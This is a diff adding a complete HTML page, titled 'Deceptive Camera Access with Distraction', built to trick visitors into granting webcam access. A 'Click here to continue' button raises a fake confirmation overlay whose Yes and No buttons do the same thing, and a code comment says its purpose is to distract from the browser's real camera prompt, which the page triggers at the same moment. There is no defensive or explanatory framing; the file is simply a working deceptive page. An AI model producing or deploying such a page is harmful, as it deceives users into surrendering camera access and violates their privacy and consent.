@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deceptive Camera Access with Distraction</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        .button {
+            padding: 15px 30px;
+            font-size: 18px;
+            color: white;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+        #video {
+            display: none;
+            margin-top: 20px;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+        .fake-prompt {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .fake-button {
+            padding: 10px 20px;
+            margin: 5px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <button class="button" onclick="requestCamera()">Click here to continue</button>
+    <video id="video" autoplay></video>
+    <div class="overlay" id="overlay">
+        <div class="fake-prompt">
+            <p>Please confirm to proceed!</p>
+            <button class="fake-button" onclick="hideOverlay()">Yes</button>
+            <button class="fake-button" onclick="hideOverlay()">No</button>
+        </div>
+    </div>
+
+    <script>
+        function requestCamera() {
+            // Show a fake overlay to distract from the real prompt
+            document.getElementById('overlay').style.display = 'flex';
+            
+            // Request camera access
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const videoElement = document.getElementById('video');
+                    videoElement.srcObject = stream;
+                    videoElement.style.display = 'block';
+                    document.querySelector('.button').style.display = 'none';
+                    document.getElementById('overlay').style.display = 'none'; // Hide overlay after success
+                })
+                .catch(err => {
+                    console.error("Error accessing camera: ", err);
+                    document.getElementById('overlay').style.display = 'none';
+                    alert("Camera access denied or unavailable.");
+                });
+        }
+
+        function hideOverlay() {
+            // Hide the fake overlay when user interacts with it
+            document.getElementById('overlay').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
